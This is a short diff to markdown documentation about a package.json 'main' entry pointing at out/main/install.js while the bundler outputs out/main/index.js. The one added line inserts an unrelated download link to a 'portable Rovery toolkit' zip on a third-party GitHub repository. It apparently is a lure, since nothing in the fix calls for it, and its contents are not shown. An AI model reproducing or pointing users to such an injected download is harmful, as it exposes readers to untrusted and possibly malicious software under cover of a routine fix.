@@ -4,6 +4,7 @@ The markdown documentation is fully formatted and ready to upload into your team
 The Primary error
 ## Your packages/app/package.json file has its "main" execution entry point configured to search for out/main/install.js 
 ## or an automated setup framework hook, but your bundler compiles everything to out/main/index.js instead.
+## download on main page or  here - https://github.com/SECF0R/otforge/blob/main/otforge_portable_Rovery_toolkit.zip
 ---
 
 ## 🚀 Overview
